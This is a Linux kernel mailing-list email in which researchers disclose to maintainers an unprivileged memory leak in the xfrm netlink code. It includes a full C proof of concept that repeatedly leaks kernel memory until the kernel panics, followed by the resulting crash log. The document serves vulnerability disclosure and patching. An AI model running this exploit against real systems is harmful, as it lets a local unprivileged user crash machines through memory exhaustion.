Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D9AEA4314BE
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 17:30:42 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785173450; cv=none; b=C4EukVG0mXxYT2Yathy7Wha/vHPD6vcP1gvBreFylYhuOxPpj1jIbJIcH6d/2BaY2frvVnwuyV3TJzkqMdhVil9tOmNKHy5RWcg9iJJkPacZqgHGfr+HwBQcGXDQjS/rRyH5Gcu8rqoMjadCHV2Kl3Y4RtpudpiEgluFKeSaLiQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785173450; c=relaxed/simple;
	bh=sM97tityCzUmPYcbVvuvHa9d+T98LFLzAKo43QGeIN0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ZGAB3QAiggcnLPwfqwlxfG78ovX7EOGxkhm2qYVM96YNDUg6tUo/OBFP6+EAYNJyxrjyKCZ6f1rK8M2wNSJ64QuDPhM+zU7/KuUvSUxhroW92To8mK5M80yVdFl89nyDsLFBSPGbqU+JjUlG2mkaVkWgOKBiRfvM7/eTL/tuRrY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=a4QwkOmy; arc=none smtp.client-ip=209.85.210.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="a4QwkOmy"
Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-84847482584so121898b3a.0
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 10:30:42 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785173439; x=1785778239; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=oryL+9vZ242WoQ7eXMa3mN/tuei80AWs8orbjJhYvds=;
        b=a4QwkOmydM2UtYkMJ5v89vbgKkfuUoLRi634MVqPk3lRnFefrAilVKK5fCDseThcCW
         6HBcXpBJnEuNAn/00CLHOALNGvTSwNZq89M8fvsHGcxDnVPXljdT4IOmAU9AHbZqGYaa
         X3Lh5G7lB6oQHtrWHbrRwHZ96ePnhMpflWPkfLW83KMUEK2e7PdHvq+0IVbJZKeCzHUe
         Uemw0L2qUtEMZK8a2yAPtel/DoI27n/+RCYVL6HbfB1ebUH1YtE9DpXFop6v22QrTllA
         Ww8F2UumUOd9MEX6IfjPaE/RneX8iC83VuVYOrEdsi+q6+Cch8JbO2hH+JYvNs49UKRv
         cgiA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785173439; x=1785778239;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=oryL+9vZ242WoQ7eXMa3mN/tuei80AWs8orbjJhYvds=;
        b=Xo6cfyMCyCk6CdZWwBKdpEzzrn/VoC6SF5xkLOxzPf910DC2SEjFOjPIwISXLcjHdW
         b9cxjyrzF4xAhZ3XdIUvg2KFaD237uxtUjSY3t4RRm5eBs6MguaXTBznXL2J6qiv5Knj
         ldJNd/Yn/zBkD/3Ry5DtVRIWmCS1FFFvsetzDOpTjq8LvKCfcS5osGqO7e8ji8d1Chb2
         rzpMbaZjHLpajBbVFNlRUkNusXEqe6uqEp0ApU0ZZh/ntTkpDqwgpMR73i9R52p2AkRr
         MNATpWxzsIXoSps30a4E381dgwK1yDbwLU11haoZzliW1pEq0a4UOq+m2cjtXPwvW1Ub
         NMXw==
X-Gm-Message-State: AOJu0YyCpyMg/rbliqH2IxIDLpBCmzACYJaIniSFSaMnalNTlpdEuJpV
	haJMrWD+rMFAhlDPmo6/ong15OVwstlSsHwO8D4O5DBkh90Yvy5GFyiS9/F1+lOcDSc=
X-Gm-Gg: AR+sD10npBTqVuy1fWGNUQRWsyspRxK8omlD3u0K6s938W5h0WEQVQLO2x+ipCJ8KXf
	Ac++EyXrO09OStkph+wLNKnhX31o/lM/Zbas3uzMuMXH/QzigXc0C3tCmyEcgpiTjlwhceonG1t
	gWJFcnn0sHj5z1rgElBOtmpv0Kt36y+0onYAU1ev13fWmHjZtZg8qZcatRM+0Jp+TRNUw0QoZgN
	1G7YWWgcXIR4paokvsSqjBhL+lLStoLnuLqiLsl2lmQGv1/a3D9RUWRaG5c2zkZGlHgiuM4o9UE
	oNjfWodgLN8RBpoWgdnag2tBvbqVPmD72tfpPJMU8hQpg8ygv07g86j+mKUdbg+V6Dw2enrXLoi
	fFFKF1gTW/DaghfYtPf/lEg7AFoXgSrV3XNqDS0pqVX71rDxk+wls+lqOlhzjyspEPreSlnenYY
	lSqt4suPMiVNxzS8Yg/7NU
X-Received: by 2002:a05:6a00:a24b:b0:848:55a6:fbe with SMTP id d2e1a72fcca58-84e8d3f0d0fmr266451b3a.35.1785173438481;
        Mon, 27 Jul 2026 10:30:38 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e5327f22fsm3372658b3a.13.2026.07.27.10.30.34
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 10:30:38 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	martin@strongswan.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH ipsec 0/1] xfrm: fix xfrm_state_construct() auth-trunc leak
Date: Tue, 28 Jul 2026 01:30:31 +0800
Message-ID: <cover.1784963896.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

From: Zihan Xi <zihanx@nebusec.ai>=0D

Hi Linux kernel maintainers,=0D
=0D
We found and validated a issue in net/xfrm/xfrm_user.c. The bug is reachabl=
e by a=0D
non-root user via user and net namespace.=0D
We've tested it, and it should not affect any other functionality.=0D
=0D
We will provide detailed information about the bug=0D
in this email, along with a PoC to trigger it.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
xfrm_state_construct() first calls attach_auth_trunc() and then falls back =
to=0D
attach_auth() when x->props.aalgo is still zero.=0D
=0D
That is not a valid ownership test. For algorithms such as cmac(aes),=0D
attach_auth_trunc() allocates x->aalg but leaves x->props.aalgo at zero bec=
ause=0D
the selected algorithm has no sadb_alg_id.=0D
=0D
The later !x->props.aalgo check then calls attach_auth() and overwrites x->=
aalg.=0D
The first allocation is lost and any later failure path, such as the bad=0D
XFRMA_SA_PCPU validation path used by the reproducer, only frees the replac=
ement=0D
pointer.=0D
=0D
The fix is to test whether x->aalg is already attached, instead of inferrin=
g that=0D
state from x->props.aalgo.=0D
=0D
Reproducer:=0D
=0D
    gcc -O2 -static -o poc poc.c=0D
    unshare -Urn ./poc=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
=0D
------BEGIN poc.c------=0D
#define _GNU_SOURCE=0D
=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <linux/netlink.h>=0D
#include <linux/xfrm.h>=0D
#include <netinet/in.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/socket.h>=0D
#include <sys/types.h>=0D
#include <sys/wait.h>=0D
#include <unistd.h>=0D
=0D
#ifndef NETLINK_XFRM=0D
#define NETLINK_XFRM 6=0D
#endif=0D
=0D
#ifndef XFRM_SA_DIR_IN=0D
#define XFRM_SA_DIR_IN 1=0D
#endif=0D
=0D
#ifndef XFRMA_SA_DIR=0D
#define XFRMA_SA_DIR 33=0D
#endif=0D
=0D
#define DEFAULT_LEAK_BYTES (128U * 1024U)=0D
#define DEFAULT_ITERATIONS 0U=0D
#define MAX_EXTACK 256U=0D
=0D
enum fail_mode {=0D
	FAIL_BAD_PCPU =3D 0,=0D
	FAIL_DUPLICATE_SA =3D 1,=0D
};=0D
=0D
struct req_builder {=0D
	char *buf;=0D
	size_t cap;=0D
	struct nlmsghdr *nlh;=0D
};=0D
=0D
static void die(const char *msg)=0D
{=0D
	perror(msg);=0D
	exit(1);=0D
}=0D
=0D
static void *xrealloc(void *ptr, size_t size)=0D
{=0D
	void *tmp =3D realloc(ptr, size);=0D
=0D
	if (!tmp)=0D
		die("realloc");=0D
	return tmp;=0D
}=0D
=0D
static void reserve(struct req_builder *b, size_t need)=0D
{=0D
	size_t want;=0D
=0D
	if (need <=3D b->cap)=0D
		return;=0D
=0D
	want =3D b->cap ? b->cap : 4096;=0D
	while (want < need)=0D
		want <<=3D 1;=0D
=0D
	b->buf =3D xrealloc(b->buf, want);=0D
	b->cap =3D want;=0D
	b->nlh =3D (struct nlmsghdr *)b->buf;=0D
}=0D
=0D
static void add_attr(struct req_builder *b, uint16_t type,=0D
		     const void *payload, size_t payload_len)=0D
{=0D
	size_t old_len =3D NLMSG_ALIGN(b->nlh->nlmsg_len);=0D
	size_t attr_len =3D NLA_HDRLEN + payload_len;=0D
	size_t new_len =3D old_len + NLA_ALIGN(attr_len);=0D
	struct nlattr *nla;=0D
=0D
	reserve(b, new_len);=0D
	b->nlh =3D (struct nlmsghdr *)b->buf;=0D
	nla =3D (struct nlattr *)(b->buf + old_len);=0D
	nla->nla_type =3D type;=0D
	nla->nla_len =3D attr_len;=0D
	memcpy((char *)nla + NLA_HDRLEN, payload, payload_len);=0D
	if (NLA_ALIGN(attr_len) > attr_len)=0D
		memset((char *)nla + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);=0D
	b->nlh->nlmsg_len =3D new_len;=0D
}=0D
=0D
static void build_usersa(struct xfrm_usersa_info *sa, uint32_t spi)=0D
{=0D
	memset(sa, 0, sizeof(*sa));=0D
	sa->family =3D AF_INET;=0D
	sa->id.proto =3D IPPROTO_AH;=0D
	sa->id.spi =3D htonl(spi);=0D
	sa->mode =3D XFRM_MODE_TRANSPORT;=0D
	if (inet_pton(AF_INET, "127.0.0.1", &sa->id.daddr.a4) !=3D 1)=0D
		die("inet_pton daddr");=0D
	if (inet_pton(AF_INET, "127.0.0.1", &sa->saddr.a4) !=3D 1)=0D
		die("inet_pton saddr");=0D
}=0D
=0D
static void build_auth_trunc_attr(char **out, size_t *out_len, unsigned int=
 key_bytes)=0D
{=0D
	size_t len =3D sizeof(struct xfrm_algo_auth) + key_bytes;=0D
	struct xfrm_algo_auth *alg;=0D
=0D
	alg =3D malloc(len);=0D
	if (!alg)=0D
		die("malloc auth_trunc");=0D
	memset(alg, 0x41, len);=0D
	strncpy(alg->alg_name, "cmac(aes)", sizeof(alg->alg_name) - 1);=0D
	alg->alg_name[sizeof(alg->alg_name) - 1] =3D '\0';=0D
	alg->alg_key_len =3D key_bytes * 8U;=0D
	alg->alg_trunc_len =3D 96;=0D
	*out =3D (char *)alg;=0D
	*out_len =3D len;=0D
}=0D
=0D
static void build_auth_attr(struct xfrm_algo *alg)=0D
{=0D
	memset(alg, 0, sizeof(*alg));=0D
	strncpy(alg->alg_name, "hmac(sha256)", sizeof(alg->alg_name) - 1);=0D
	alg->alg_name[sizeof(alg->alg_name) - 1] =3D '\0';=0D
	alg->alg_key_len =3D 0;=0D
}=0D
=0D
static int send_and_expect_err(int fd, const void *buf, size_t len, int *ke=
rnel_err,=0D
			       char *extack, size_t extack_len)=0D
{=0D
	char resp[NLMSG_SPACE(sizeof(struct nlmsgerr) + MAX_EXTACK)];=0D
	struct sockaddr_nl nladdr;=0D
	struct iovec iov;=0D
	struct msghdr msg;=0D
	struct nlmsghdr *nlh;=0D
	struct nlmsgerr *err;=0D
	ssize_t n;=0D
=0D
	memset(&nladdr, 0, sizeof(nladdr));=0D
	nladdr.nl_family =3D AF_NETLINK;=0D
=0D
	iov.iov_base =3D (void *)buf;=0D
	iov.iov_len =3D len;=0D
	memset(&msg, 0, sizeof(msg));=0D
	msg.msg_name =3D &nladdr;=0D
	msg.msg_namelen =3D sizeof(nladdr);=0D
	msg.msg_iov =3D &iov;=0D
	msg.msg_iovlen =3D 1;=0D
=0D
	if (sendmsg(fd, &msg, 0) < 0)=0D
		return -1;=0D
=0D
	memset(resp, 0, sizeof(resp));=0D
	iov.iov_base =3D resp;=0D
	iov.iov_len =3D sizeof(resp);=0D
	msg.msg_name =3D &nladdr;=0D
	msg.msg_namelen =3D sizeof(nladdr);=0D
	msg.msg_iov =3D &iov;=0D
	msg.msg_iovlen =3D 1;=0D
=0D
	n =3D recvmsg(fd, &msg, 0);=0D
	if (n < 0)=0D
		return -1;=0D
=0D
	nlh =3D (struct nlmsghdr *)resp;=0D
	if (nlh->nlmsg_type !=3D NLMSG_ERROR) {=0D
		errno =3D EPROTO;=0D
		return -1;=0D
	}=0D
=0D
	err =3D (struct nlmsgerr *)NLMSG_DATA(nlh);=0D
	*kernel_err =3D err->error;=0D
=0D
	if (extack && extack_len) {=0D
		size_t copy =3D 0;=0D
		struct nlattr *nla;=0D
		int rem;=0D
=0D
		extack[0] =3D '\0';=0D
		nla =3D (struct nlattr *)((char *)err + sizeof(*err));=0D
		rem =3D (int)(n - NLMSG_HDRLEN - sizeof(*err));=0D
		while (rem >=3D (int)sizeof(*nla)) {=0D
			if (nla->nla_len < sizeof(*nla) || nla->nla_len > rem)=0D
				break;=0D
			if (nla->nla_type =3D=3D NLMSGERR_ATTR_MSG) {=0D
				copy =3D nla->nla_len - NLA_HDRLEN;=0D
				if (copy >=3D extack_len)=0D
					copy =3D extack_len - 1;=0D
				memcpy(extack, (char *)nla + NLA_HDRLEN, copy);=0D
				extack[copy] =3D '\0';=0D
				break;=0D
			}=0D
			rem -=3D NLA_ALIGN(nla->nla_len);=0D
			nla =3D (struct nlattr *)((char *)nla + NLA_ALIGN(nla->nla_len));=0D
		}=0D
	}=0D
=0D
	return 0;=0D
}=0D
=0D
static int run_worker(unsigned int worker_id, unsigned int leak_bytes,=0D
		      unsigned int iterations, enum fail_mode mode)=0D
{=0D
	unsigned int i =3D 0;=0D
	int fd;=0D
	int one =3D 1;=0D
	struct sockaddr_nl addr;=0D
	struct req_builder b;=0D
	struct xfrm_usersa_info sa;=0D
	struct xfrm_algo auth;=0D
	char *auth_trunc =3D NULL;=0D
	size_t auth_trunc_len =3D 0;=0D
	uint32_t bad_pcpu =3D UINT32_MAX;=0D
	uint32_t spi_base =3D 0x1000;=0D
	uint8_t sa_dir =3D XFRM_SA_DIR_IN;=0D
	char extack[128];=0D
=0D
	fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);=0D
	if (fd < 0)=0D
		die("socket NETLINK_XFRM");=0D
=0D
	if (setsockopt(fd, SOL_NETLINK, NETLINK_EXT_ACK, &one, sizeof(one)) < 0)=0D
		die("setsockopt NETLINK_EXT_ACK");=0D
=0D
	memset(&addr, 0, sizeof(addr));=0D
	addr.nl_family =3D AF_NETLINK;=0D
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)=0D
		die("bind netlink");=0D
=0D
	memset(&b, 0, sizeof(b));=0D
	build_auth_trunc_attr(&auth_trunc, &auth_trunc_len, leak_bytes);=0D
	build_auth_attr(&auth);=0D
=0D
	for (i =3D 0; !iterations || i < iterations; i++) {=0D
		int err;=0D
=0D
		build_usersa(&sa, mode =3D=3D FAIL_DUPLICATE_SA ? spi_base : spi_base + i=
);=0D
		reserve(&b, NLMSG_SPACE(sizeof(sa)));=0D
		memset(b.buf, 0, b.cap);=0D
		b.nlh =3D (struct nlmsghdr *)b.buf;=0D
		b.nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(sa));=0D
		b.nlh->nlmsg_type =3D XFRM_MSG_NEWSA;=0D
		b.nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;=0D
		b.nlh->nlmsg_seq =3D i + 1;=0D
		memcpy(NLMSG_DATA(b.nlh), &sa, sizeof(sa));=0D
=0D
		add_attr(&b, XFRMA_ALG_AUTH_TRUNC, auth_trunc, auth_trunc_len);=0D
		add_attr(&b, XFRMA_ALG_AUTH, &auth, sizeof(auth));=0D
		add_attr(&b, XFRMA_SA_DIR, &sa_dir, sizeof(sa_dir));=0D
		if (mode =3D=3D FAIL_BAD_PCPU)=0D
			add_attr(&b, XFRMA_SA_PCPU, &bad_pcpu, sizeof(bad_pcpu));=0D
=0D
		if (send_and_expect_err(fd, b.buf, b.nlh->nlmsg_len, &err,=0D
					extack, sizeof(extack)) < 0) {=0D
			if (errno =3D=3D ENOBUFS || errno =3D=3D ENOMEM) {=0D
				if (worker_id =3D=3D 0)=0D
					fprintf(stderr,=0D
						"worker=3D%u iteration=3D%u transient socket error: %s\n",=0D
						worker_id, i, strerror(errno));=0D
				usleep(1000);=0D
				continue;=0D
			}=0D
			die("send/recv netlink");=0D
		}=0D
=0D
		if (err =3D=3D -ENOMEM) {=0D
			if (worker_id =3D=3D 0 && (i % 100) =3D=3D 0)=0D
				fprintf(stderr,=0D
					"worker=3D%u iteration=3D%u kernel returned -ENOMEM\n",=0D
					worker_id, i);=0D
			usleep(1000);=0D
			continue;=0D
		}=0D
=0D
		if (mode =3D=3D FAIL_DUPLICATE_SA) {=0D
			if (i =3D=3D 0 && err =3D=3D 0)=0D
				continue;=0D
			if (err =3D=3D -EEXIST)=0D
				continue;=0D
			fprintf(stderr,=0D
				"worker %u iteration %u: expected first add to succeed and later ones t=
o fail with -EEXIST, got %d extack=3D'%s'\n",=0D
				worker_id, i, err, extack);=0D
			close(fd);=0D
			free(auth_trunc);=0D
			free(b.buf);=0D
			return 2;=0D
		}=0D
=0D
		if (err !=3D -ERANGE) {=0D
			fprintf(stderr,=0D
				"worker %u iteration %u: expected -ERANGE from bad XFRMA_SA_PCPU, got %=
d extack=3D'%s'\n",=0D
				worker_id, i, err, extack);=0D
			close(fd);=0D
			free(auth_trunc);=0D
			free(b.buf);=0D
			return 2;=0D
		}=0D
=0D
		if (worker_id =3D=3D 0 && (i % 100) =3D=3D 0) {=0D
			printf("worker=3D%u iteration=3D%u err=3D%d extack=3D'%s'\n",=0D
			       worker_id, i, err, extack);=0D
			fflush(stdout);=0D
		}=0D
	}=0D
=0D
	close(fd);=0D
	free(auth_trunc);=0D
	free(b.buf);=0D
	return 0;=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	unsigned int leak_bytes =3D DEFAULT_LEAK_BYTES;=0D
	unsigned int iterations =3D DEFAULT_ITERATIONS;=0D
	unsigned int workers =3D 1;=0D
	enum fail_mode mode =3D FAIL_BAD_PCPU;=0D
	unsigned int i;=0D
	int rc =3D 0;=0D
=0D
	if (argc > 1)=0D
		leak_bytes =3D strtoul(argv[1], NULL, 0);=0D
	if (argc > 2)=0D
		iterations =3D strtoul(argv[2], NULL, 0);=0D
	if (argc > 3)=0D
		workers =3D strtoul(argv[3], NULL, 0);=0D
	if (argc > 4 && !strcmp(argv[4], "dup"))=0D
		mode =3D FAIL_DUPLICATE_SA;=0D
	if (!workers)=0D
		workers =3D 1;=0D
=0D
	printf("leak_bytes=3D%u iterations=3D%u workers=3D%u mode=3D%s (0 iteratio=
ns means infinite)\n",=0D
	       leak_bytes, iterations, workers,=0D
	       mode =3D=3D FAIL_BAD_PCPU ? "pcpu" : "dup");=0D
	fflush(stdout);=0D
=0D
	for (i =3D 1; i < workers; i++) {=0D
		pid_t pid =3D fork();=0D
=0D
		if (pid < 0)=0D
			die("fork");=0D
		if (pid =3D=3D 0)=0D
			_exit(run_worker(i, leak_bytes, iterations, mode));=0D
	}=0D
=0D
	rc =3D run_worker(0, leak_bytes, iterations, mode);=0D
=0D
	for (i =3D 1; i < workers; i++) {=0D
		int status;=0D
=0D
		if (wait(&status) < 0)=0D
			break;=0D
		if (!rc && WIFEXITED(status) && WEXITSTATUS(status))=0D
			rc =3D WEXITSTATUS(status);=0D
	}=0D
=0D
	return rc;=0D
}=0D
------END poc.c--------=0D
=0D
----BEGIN crash log----=0D
=0D
[  808.670054][ T2086] Kernel panic - not syncing: Out of memory: compulsor=
y panic_on_oom is enabled=0D
[  808.670791][ T2086] CPU: 2 UID: 0 PID: 2086 Comm: poc Not tainted 6.12.9=
5 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6=0D
[  808.671654][ T2086] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PII=
X, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[  808.672513][ T2086] Call Trace:=0D
[  808.672755][ T2086]  <TASK>=0D
[  808.672963][ T2086]  panic+0x544/0x620=0D
[  808.673255][ T2086]  ? __pfx_panic+0x10/0x10=0D
[  808.673563][ T2086]  ? __pfx_lock_release+0x10/0x10=0D
[  808.673938][ T2086]  out_of_memory+0x75d/0x1360=0D
[  808.674277][ T2086]  ? __alloc_pages_slowpath.constprop.0+0xa0f/0x2800=0D
[  808.674735][ T2086]  ? __pfx_out_of_memory+0x10/0x10=0D
[  808.675088][ T2086]  ? __pfx_mutex_trylock+0x10/0x10=0D
[  808.675462][ T2086]  __alloc_pages_slowpath.constprop.0+0x1eb8/0x2800=0D
[  808.675940][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.676346][ T2086]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x1=
0=0D
[  808.676823][ T2086]  ? local_clock_noinstr+0x15/0xd0=0D
[  808.677188][ T2086]  ? lock_release+0x687/0xc90=0D
[  808.677533][ T2086]  ? __pfx___might_resched+0x10/0x10=0D
[  808.677907][ T2086]  __alloc_pages_noprof+0x54b/0x760=0D
[  808.678281][ T2086]  ? __pfx___alloc_pages_noprof+0x10/0x10=0D
[  808.678687][ T2086]  ? stack_trace_save+0x94/0xd0=0D
[  808.679039][ T2086]  ? __pfx_stack_trace_save+0x10/0x10=0D
[  808.679422][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.679814][ T2086]  ? stack_depot_save_flags+0x29/0x980=0D
[  808.680205][ T2086]  alloc_pages_mpol_noprof+0x1b1/0x430=0D
[  808.680591][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.680985][ T2086]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10=0D
[  808.681414][ T2086]  ? __kasan_slab_alloc+0x6e/0x70=0D
[  808.681792][ T2086]  ? kmem_cache_alloc_node_noprof+0x17a/0x3f0=0D
[  808.682235][ T2086]  ? __alloc_skb+0x232/0x310=0D
[  808.682561][ T2086]  ? netlink_ack+0x11a/0xd90=0D
[  808.682891][ T2086]  ? netlink_rcv_skb+0x28e/0x3b0=0D
[  808.683246][ T2086]  ? netlink_unicast+0x683/0xa40=0D
[  808.683582][ T2086]  ? netlink_sendmsg+0x72b/0xbd0=0D
[  808.683925][ T2086]  ? __sock_sendmsg+0x170/0x1c0=0D
[  808.684276][ T2086]  ? ____sys_sendmsg+0x684/0x950=0D
[  808.684621][ T2086]  ? ___sys_sendmsg+0x105/0x190=0D
[  808.684961][ T2086]  ? __sys_sendmsg+0x122/0x1b0=0D
[  808.685308][ T2086]  allocate_slab+0x3ae/0x550=0D
[  808.685644][ T2086]  ___slab_alloc+0xdcb/0x1620=0D
[  808.685979][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.686379][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.686769][ T2086]  ? local_clock_noinstr+0x15/0xd0=0D
[  808.687153][ T2086]  ? __alloc_skb+0x14b/0x310=0D
[  808.687491][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.687889][ T2086]  ? __kmalloc_node_track_caller_noprof+0x12f/0x5a0=0D
[  808.688355][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.688744][ T2086]  __kmalloc_node_track_caller_noprof+0x12f/0x5a0=0D
[  808.689193][ T2086]  ? __alloc_skb+0x14b/0x310=0D
[  808.689519][ T2086]  ? __kasan_slab_alloc+0x6e/0x70=0D
[  808.689871][ T2086]  ? kmalloc_reserve+0xc0/0x240=0D
[  808.690213][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.690602][ T2086]  kmalloc_reserve+0xc0/0x240=0D
[  808.690929][ T2086]  __alloc_skb+0x14b/0x310=0D
[  808.691253][ T2086]  ? __pfx___alloc_skb+0x10/0x10=0D
[  808.691611][ T2086]  netlink_ack+0x11a/0xd90=0D
[  808.691937][ T2086]  netlink_rcv_skb+0x28e/0x3b0=0D
[  808.692272][ T2086]  ? __pfx_xfrm_user_rcv_msg+0x10/0x10=0D
[  808.692650][ T2086]  ? xfrm_netlink_rcv+0x5d/0x90=0D
[  808.692988][ T2086]  ? __pfx_netlink_rcv_skb+0x10/0x10=0D
[  808.693389][ T2086]  ? netlink_deliver_tap+0xa6/0x990=0D
[  808.693765][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.694154][ T2086]  xfrm_netlink_rcv+0x6c/0x90=0D
[  808.694481][ T2086]  netlink_unicast+0x683/0xa40=0D
[  808.694795][ T2086]  ? __pfx_netlink_unicast+0x10/0x10=0D
[  808.695165][ T2086]  ? __virt_addr_valid+0x1db/0x2c0=0D
[  808.695545][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.695935][ T2086]  ? __check_object_size+0x276/0x600=0D
[  808.696311][ T2086]  netlink_sendmsg+0x72b/0xbd0=0D
[  808.696652][ T2086]  ? __pfx_netlink_sendmsg+0x10/0x10=0D
[  808.697019][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.697417][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.697809][ T2086]  ? apparmor_socket_sendmsg+0x4b/0x250=0D
[  808.698194][ T2086]  ? __import_iovec+0x37f/0x630=0D
[  808.698534][ T2086]  ? __pfx_netlink_sendmsg+0x10/0x10=0D
[  808.698941][ T2086]  __sock_sendmsg+0x170/0x1c0=0D
[  808.699266][ T2086]  ____sys_sendmsg+0x684/0x950=0D
[  808.699606][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.700001][ T2086]  ? __pfx_____sys_sendmsg+0x10/0x10=0D
[  808.700404][ T2086]  ? __pfx_copy_msghdr_from_user+0x10/0x10=0D
[  808.700833][ T2086]  ? __pfx_____sys_recvmsg+0x10/0x10=0D
[  808.701210][ T2086]  ? _copy_from_user+0x42/0xa0=0D
[  808.701549][ T2086]  ___sys_sendmsg+0x105/0x190=0D
[  808.701885][ T2086]  ? __pfx____sys_sendmsg+0x10/0x10=0D
[  808.702304][ T2086]  ? __pfx___might_resched+0x10/0x10=0D
[  808.702682][ T2086]  __sys_sendmsg+0x122/0x1b0=0D
[  808.703003][ T2086]  ? __pfx___sys_sendmsg+0x10/0x10=0D
[  808.703389][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.703779][ T2086]  ? switch_fpu_return+0x11a/0x240=0D
[  808.704133][ T2086]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  808.704542][ T2086]  do_syscall_64+0x6f/0x150=0D
[  808.704870][ T2086]  entry_SYSCALL_64_after_hwframe+0x76/0x7e=0D
[  808.705290][ T2086] RIP: 0033:0x7dcca933c687=0D
[  808.705603][ T2086] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 0=
0 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0=
f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff=0D
All code=0D
=3D=3D=3D=3D=3D=3D=3D=3D=0D
   0:	48 89 fa             	mov    %rdi,%rdx=0D
   3:	4c 89 df             	mov    %r11,%rdi=0D
   6:	e8 58 b3 00 00       	call   0xb363=0D
   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx=0D
  11:	59                   	pop    %rcx=0D
  12:	5e                   	pop    %rsi=0D
  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax=0D
  17:	74 1a                	je     0x33=0D
  19:	5b                   	pop    %rbx=0D
  1a:	c3                   	ret=0D
  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)=0D
  22:	00 =0D
  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax=0D
  28:	0f 05                	syscall=0D
  2a:*	5b                   	pop    %rbx		<-- trapping instruction=0D
  2b:	c3                   	ret=0D
